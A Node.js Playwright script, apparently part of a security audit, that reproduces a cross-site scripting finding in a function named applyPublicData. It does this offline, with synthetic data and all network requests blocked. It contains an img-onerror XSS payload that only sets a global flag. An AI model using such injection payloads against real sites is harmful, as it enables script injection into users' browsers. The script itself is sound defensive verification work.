// Local-only reproduction using synthetic data. Every browser request is blocked.
const fs=require('node:fs');
const path=require('node:path');
const {chromium}=require('playwright');
const repo=path.resolve(__dirname,'../../..');
const testDir=path.join(repo,'auditoria/cp0-2026-11-17/scripts');
const original=fs.readFileSync(path.join(testDir,'legacy_checks.cjs'),'utf8');
const prefix=original.slice(0,original.indexOf('(async()=>{'));
const {context}=new Function('require','__dirname',prefix+'\nreturn {context};')(require,testDir);
(async()=>{
  const state=context();const target={innerHTML:''};
  state.elements.displayFormatsPublicGrid=target;
  state.ctx.artistData.formats=[{title:'<img src="https://example.invalid/synthetic" onerror="globalThis.stagekitSyntheticXss=true">',sub:'Teste',desc:'Sintético',photo:''}];
  state.install('applyPublicData');state.ctx.applyPublicData();
  const browser=await chromium.launch({headless:true,executablePath:'/usr/bin/chromium',args:['--no-sandbox']});
  try {
    const ctx=await browser.newContext({offline:true});
    await ctx.route('**/*',route=>route.abort());
    const page=await ctx.newPage();
    await page.setContent(target.innerHTML,{waitUntil:'load'});
    const executed=await page.evaluate(()=>globalThis.stagekitSyntheticXss===true);
    const report={observed_at_utc:new Date().toISOString(),source_commit:'3399f680c01301cb19f36305fac9a064764d10b6',
      function:'applyPublicData',fixture:'Synthetic title containing an image error handler',
      browser:'Chromium headless',network:'offline; all requests aborted',
      synthetic_script_executed:executed,
      production_tested:false,stored_attack_tested:false,
      limitation:'Demonstrates execution in local HTML rendering only; does not prove persistence, CSP behavior or exploitability in production.'};
    fs.writeFileSync(path.join(__dirname,'xss-offline-result.json'),JSON.stringify(report,null,2)+'\n');
    console.log(JSON.stringify(report));
    if(!executed)process.exitCode=1;
  } finally {await browser.close();}
})().catch(e=>{console.error(e);process.exitCode=1;});
